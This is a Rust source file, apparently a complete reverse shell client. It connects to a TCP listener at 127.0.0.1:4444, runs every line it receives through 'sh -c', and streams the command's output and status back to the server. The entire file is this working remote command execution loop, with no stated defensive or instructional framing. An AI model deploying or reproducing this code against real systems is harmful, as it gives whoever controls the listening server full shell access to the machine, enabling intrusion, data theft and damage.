use std::io::{BufRead, BufReader, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};

fn main() -> std::io::Result<()> {
    let server_addr = "127.0.0.1:4444";
    println!("Connecting to server at {}...", server_addr);

    // Connect to the server
    let mut stream = TcpStream::connect(server_addr)?;
    println!("Connected to server!");

    let mut reader = BufReader::new(stream.try_clone()?);
    let mut buffer = String::new();

    loop {
        buffer.clear();

        // Wait for a command from the server
        match reader.read_line(&mut buffer) {
            Ok(0) => {
                // Server closed the connection
                println!("Server closed the connection");
                break;
            }
            Ok(_) => {
                // Remove newline characters
                let command = buffer.trim();
                println!("Received command: {}", command);

                // Execute the command
                let output = Command::new("sh")
                    .arg("-c")
                    .arg(command)
                    .stdout(Stdio::piped())
                    .stderr(Stdio::piped())
                    .output();

                match output {
                    Ok(output) => {
                        // Format the result
                        let stdout = String::from_utf8_lossy(&output.stdout);
                        let stderr = String::from_utf8_lossy(&output.stderr);
                        let status = output.status;

                        let result = format!(
                            "Command: {}\nStatus: {}\nStdout:\n{}\nStderr:\n{}\n---END---\n",
                            command,
                            if status.success() { "Success" } else { "Failed" },
                            if stdout.is_empty() { "<Empty>" } else { &stdout },
                            if stderr.is_empty() { "<Empty>" } else { &stderr }
                        );

                        // Send the result back to the server
                        if let Err(e) = stream.write_all(result.as_bytes()) {
                            eprintln!("Failed to send result to server: {}", e);
                            break;
                        }

                        if let Err(e) = stream.flush() {
                            eprintln!("Failed to flush stream: {}", e);
                            break;
                        }
                    }
                    Err(e) => {
                        // Send error message back to server
                        let error_msg = format!(
                            "Command: {}\nStatus: Failed\nError: {}\n---END---\n",
                            command, e
                        );

                        if let Err(e) = stream.write_all(error_msg.as_bytes()) {
                            eprintln!("Failed to send error to server: {}", e);
                            break;
                        }

                        if let Err(e) = stream.flush() {
                            eprintln!("Failed to flush stream: {}", e);
                            break;
                        }
                    }
                }
            }
            Err(e) => {
                eprintln!("Failed to read from server: {}", e);
                break;
            }
        }
    }

    Ok(())
}
